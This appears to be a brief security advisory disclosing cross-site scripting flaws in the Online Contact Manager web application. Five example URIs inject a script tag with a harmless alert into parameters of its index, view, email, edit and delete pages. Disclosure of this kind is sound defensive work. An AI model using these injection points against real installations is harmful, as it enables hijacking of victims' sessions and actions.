Online Contact Manager Multiple Cross Site Scripting Vulnerabilities

To exploit these issues, an attacker must entice an unsuspecting victim into following a malicious URI.

The following example URIs are available:

http://www.example.com/index.php?showGroup=+&lt;script&gt;alert(123)&lt;/script&gt;
http://www.example.com/view.php?id=+&lt;script&gt;alert(123)&lt;/script&gt;
http://www.example.com/email.php?id=+&lt;script&gt;alert(123)&lt;/script&gt;
http://www.example.com/edit.php?id=+&lt;script&gt;alert(123)&lt;/script&gt;
http://www.example.com/delete.php?id=+&lt;script&gt;alert(123)&lt;/script&gt;
